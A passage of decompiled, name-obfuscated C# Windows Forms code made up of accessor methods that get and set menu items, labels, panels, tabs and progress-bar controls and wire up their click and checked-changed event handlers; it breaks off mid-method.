    internal virtual ToolStripMenuItem vmethod_104()
    {
        return this.toolStripMenuItem_22;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_105(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_42);
        ToolStripMenuItem item = this.toolStripMenuItem_22;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_22 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_22;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_106()
    {
        return this.toolStripSeparator_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_107(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_5 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_108()
    {
        return this.toolStripMenuItem_23;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_109(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_45);
        ToolStripMenuItem item = this.toolStripMenuItem_23;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_23 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_23;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_11(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_0 = toolStripSeparator_39;
    }

    internal virtual ContextMenuStrip vmethod_110()
    {
        return this.contextMenuStrip_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_111(ContextMenuStrip contextMenuStrip_14)
    {
        this.contextMenuStrip_4 = contextMenuStrip_14;
    }

    internal virtual ToolStripMenuItem vmethod_112()
    {
        return this.toolStripMenuItem_24;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_113(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_46);
        ToolStripMenuItem item = this.toolStripMenuItem_24;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_24 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_24;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_114()
    {
        return this.toolStripSeparator_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_115(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_6 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_116()
    {
        return this.toolStripMenuItem_25;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_117(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_47);
        ToolStripMenuItem item = this.toolStripMenuItem_25;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_25 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_25;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ImageList vmethod_118()
    {
        return this.imageList_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_119(ImageList imageList_4)
    {
        this.imageList_0 = imageList_4;
    }

    internal virtual ToolStripMenuItem vmethod_12()
    {
        return this.toolStripMenuItem_3;
    }

    internal virtual ZeroitAnidasoCircleProgress vmethod_120()
    {
        return this.zeroitAnidasoCircleProgress_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_121(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_8)
    {
        this.zeroitAnidasoCircleProgress_0 = zeroitAnidasoCircleProgress_8;
    }

    internal virtual StatusStrip vmethod_122()
    {
        return this.statusStrip_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_123(StatusStrip statusStrip_11)
    {
        this.statusStrip_0 = statusStrip_11;
    }

    internal virtual ToolStripStatusLabel vmethod_124()
    {
        return this.toolStripStatusLabel_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_125(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_0 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_126()
    {
        return this.toolStripStatusLabel_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_127(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_1 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_128()
    {
        return this.toolStripStatusLabel_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_129(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_2 = toolStripStatusLabel_40;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_13(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_21);
        ToolStripMenuItem item = this.toolStripMenuItem_3;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_3 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_3;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripStatusLabel vmethod_130()
    {
        return this.toolStripStatusLabel_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_131(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_3 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_132()
    {
        return this.toolStripStatusLabel_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_133(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_4 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripProgressBar vmethod_134()
    {
        return this.toolStripProgressBar_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_135(ToolStripProgressBar toolStripProgressBar_8)
    {
        this.toolStripProgressBar_0 = toolStripProgressBar_8;
    }

    internal virtual ToolStripMenuItem vmethod_136()
    {
        return this.toolStripMenuItem_26;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_137(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_55);
        ToolStripMenuItem item = this.toolStripMenuItem_26;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_26 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_26;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_138()
    {
        return this.toolStripMenuItem_27;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_139(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_56);
        ToolStripMenuItem item = this.toolStripMenuItem_27;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_27 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_27;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_14()
    {
        return this.toolStripMenuItem_4;
    }

    internal virtual ToolStripSeparator vmethod_140()
    {
        return this.toolStripSeparator_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_141(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_7 = toolStripSeparator_39;
    }

    internal virtual ToolStripSeparator vmethod_142()
    {
        return this.toolStripSeparator_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_143(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_8 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_144()
    {
        return this.toolStripMenuItem_28;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_145(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_28 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_146()
    {
        return this.toolStripMenuItem_29;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_147(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_29 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_148()
    {
        return this.toolStripMenuItem_30;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_149(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_59);
        ToolStripMenuItem item = this.toolStripMenuItem_30;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_30 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_30;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_15(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_4 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_150()
    {
        return this.toolStripMenuItem_31;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_151(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_31 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_152()
    {
        return this.toolStripMenuItem_32;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_153(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_70);
        ToolStripMenuItem item = this.toolStripMenuItem_32;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_32 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_32;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_154()
    {
        return this.toolStripSeparator_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_155(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_9 = toolStripSeparator_39;
    }

    internal virtual Panel vmethod_156()
    {
        return this.panel_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_157(Panel panel_2)
    {
        this.panel_0 = panel_2;
    }

    internal virtual Label vmethod_158()
    {
        return this.label_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_159(Label label_30)
    {
        this.label_5 = label_30;
    }

    internal virtual ToolStripMenuItem vmethod_16()
    {
        return this.toolStripMenuItem_5;
    }

    internal virtual ZeroitProgressBarNormal vmethod_160()
    {
        return this.zeroitProgressBarNormal_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_161(ZeroitProgressBarNormal zeroitProgressBarNormal_2)
    {
        this.zeroitProgressBarNormal_0 = zeroitProgressBarNormal_2;
    }

    internal virtual Label vmethod_162()
    {
        return this.label_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_163(Label label_30)
    {
        this.label_6 = label_30;
    }

    internal virtual Label vmethod_164()
    {
        return this.label_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_165(Label label_30)
    {
        this.label_7 = label_30;
    }

    internal virtual Label vmethod_166()
    {
        return this.label_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_167(Label label_30)
    {
        this.label_8 = label_30;
    }

    internal virtual ToolStripMenuItem vmethod_168()
    {
        return this.toolStripMenuItem_33;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_169(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_33 = toolStripMenuItem_136;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_17(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_26);
        ToolStripMenuItem item = this.toolStripMenuItem_5;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_5 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_5;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_170()
    {
        return this.toolStripMenuItem_34;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_171(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_57);
        ToolStripMenuItem item = this.toolStripMenuItem_34;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_34 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_34;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_172()
    {
        return this.toolStripMenuItem_35;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_173(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_35 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_174()
    {
        return this.toolStripMenuItem_36;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_175(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_58);
        ToolStripMenuItem item = this.toolStripMenuItem_36;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_36 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_36;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_176()
    {
        return this.toolStripSeparator_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_177(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_10 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_178()
    {
        return this.toolStripMenuItem_37;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_179(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_60);
        ToolStripMenuItem item = this.toolStripMenuItem_37;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_37 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_37;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual TabControl vmethod_18()
    {
        return this.tabControl_0;
    }

    internal virtual ToolStripMenuItem vmethod_180()
    {
        return this.toolStripMenuItem_38;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_181(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_60);
        ToolStripMenuItem item = this.toolStripMenuItem_38;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_38 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_38;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_182()
    {
        return this.toolStripMenuItem_39;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_183(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_39 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_184()
    {
        return this.toolStripMenuItem_40;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_185(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_162);
        ToolStripMenuItem item = this.toolStripMenuItem_40;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_40 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_40;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_186()
    {
        return this.toolStripMenuItem_41;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_187(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_163);
        ToolStripMenuItem item = this.toolStripMenuItem_41;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_41 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_41;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_188()
    {
        return this.toolStripSeparator_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_189(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_11 = toolStripSeparator_39;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_19(TabControl tabControl_1)
    {
        this.tabControl_0 = tabControl_1;
    }

    internal virtual ToolStripMenuItem vmethod_190()
    {
        return this.toolStripMenuItem_42;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_191(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_61);
        ToolStripMenuItem item = this.toolStripMenuItem_42;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_42 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_42;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_192()
    {
        return this.toolStripMenuItem_43;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_193(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_61);
        ToolStripMenuItem item = this.toolStripMenuItem_43;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_43 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_43;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_194()
    {
        return this.toolStripMenuItem_44;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_195(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_62);
        ToolStripMenuItem item = this.toolStripMenuItem_44;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_44 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_44;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_196()
    {
        return this.toolStripMenuItem_45;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_197(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_62);
        ToolStripMenuItem item = this.toolStripMenuItem_45;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_45 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_45;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_198()
    {
        return this.toolStripMenuItem_46;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_199(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_63);
        ToolStripMenuItem item = this.toolStripMenuItem_46;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_46 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_46;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_2()
    {
        return this.toolStripMenuItem_0;
    }

    internal virtual TabPage vmethod_20()
    {
        return this.tabPage_0;
    }

    internal virtual ToolStripMenuItem vmethod_200()
    {
        return this.toolStripMenuItem_47;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_201(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_63);
        ToolStripMenuItem item = this.toolStripMenuItem_47;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_47 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_47;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_202()
    {
        return this.toolStripMenuItem_48;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_203(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_63);
        ToolStripMenuItem item = this.toolStripMenuItem_48;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_48 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_48;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual Panel vmethod_204()
    {
        return this.panel_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_205(Panel panel_2)
    {
        this.panel_1 = panel_2;
    }

    internal virtual Label vmethod_206()
    {
        return this.label_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_207(Label label_30)
    {
        this.label_9 = label_30;
    }

    internal virtual Label vmethod_208()
    {
        return this.label_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_209(Label label_30)
    {
        this.label_10 = label_30;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_21(TabPage tabPage_17)
    {
        this.tabPage_0 = tabPage_17;
    }

    internal virtual Label vmethod_210()
    {
        return this.label_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_211(Label label_30)
    {
        this.label_11 = label_30;
    }

    internal virtual Label vmethod_212()
    {
        return this.label_12;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_213(Label label_30)
    {
        this.label_12 = label_30;
    }

    internal virtual ZeroitProgressBarNormal vmethod_214()
    {
        return this.zeroitProgressBarNormal_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_215(ZeroitProgressBarNormal zeroitProgressBarNormal_2)
    {
        this.zeroitProgressBarNormal_1 = zeroitProgressBarNormal_2;
    }

    internal virtual ToolStripMenuItem vmethod_216()
    {
        return this.toolStripMenuItem_49;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_217(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_49 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_218()
    {
        return this.toolStripMenuItem_50;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_219(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_50 = toolStripMenuItem_136;
    }

    internal virtual TabPage vmethod_22()
    {
        return this.tabPage_1;
    }

    internal virtual ToolStripMenuItem vmethod_220()
    {
        return this.toolStripMenuItem_51;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_221(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_65);
        ToolStripMenuItem item = this.toolStripMenuItem_51;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_51 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_51;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_222()
    {
        return this.toolStripMenuItem_52;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_223(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_52 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_224()
    {
        return this.toolStripMenuItem_53;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_225(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_64);
        ToolStripMenuItem item = this.toolStripMenuItem_53;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_53 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_53;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_226()
    {
        return this.toolStripMenuItem_54;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_227(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_64);
        ToolStripMenuItem item = this.toolStripMenuItem_54;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_54 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_54;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_228()
    {
        return this.toolStripMenuItem_55;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_229(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_66);
        ToolStripMenuItem item = this.toolStripMenuItem_55;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_55 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_55;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_23(TabPage tabPage_17)
    {
        this.tabPage_1 = tabPage_17;
    }

    internal virtual ToolStripMenuItem vmethod_230()
    {
        return this.toolStripMenuItem_56;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_231(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_66);
        ToolStripMenuItem item = this.toolStripMenuItem_56;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_56 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_56;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_232()
    {
        return this.toolStripMenuItem_57;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_233(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_67);
        ToolStripMenuItem item = this.toolStripMenuItem_57;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_57 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_57;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_234()
    {
        return this.toolStripMenuItem_58;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_235(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_67);
        ToolStripMenuItem item = this.toolStripMenuItem_58;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_58 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_58;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_236()
    {
        return this.toolStripMenuItem_59;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_237(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_68);
        ToolStripMenuItem item = this.toolStripMenuItem_59;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_59 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_59;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_238()
    {
        return this.toolStripMenuItem_60;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_239(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_68);
        ToolStripMenuItem item = this.toolStripMenuItem_60;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_60 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_60;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual PictureBox vmethod_24()
    {
        return this.pictureBox_0;
    }

    internal virtual ToolStripMenuItem vmethod_240()
    {
        return this.toolStripMenuItem_61;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_241(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_68);
        ToolStripMenuItem item = this.toolStripMenuItem_61;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_61 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_61;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_242()
    {
        return this.toolStripMenuItem_62;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_243(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_71);
        ToolStripMenuItem item = this.toolStripMenuItem_62;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_62 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_62;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_244()
    {
        return this.toolStripSeparator_12;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_245(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_12 = toolStripSeparator_39;
    }

    internal virtual CheckBox vmethod_246()
    {
        return this.checkBox_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_247(CheckBox checkBox_8)
    {
        EventHandler handler = new EventHandler(this.method_79);
        CheckBox box = this.checkBox_2;
        if (box != null)
        {
            box.CheckedChanged -= handler;
        }
        this.checkBox_2 = checkBox_8;
        box = this.checkBox_2;
        if (box != null)
        {
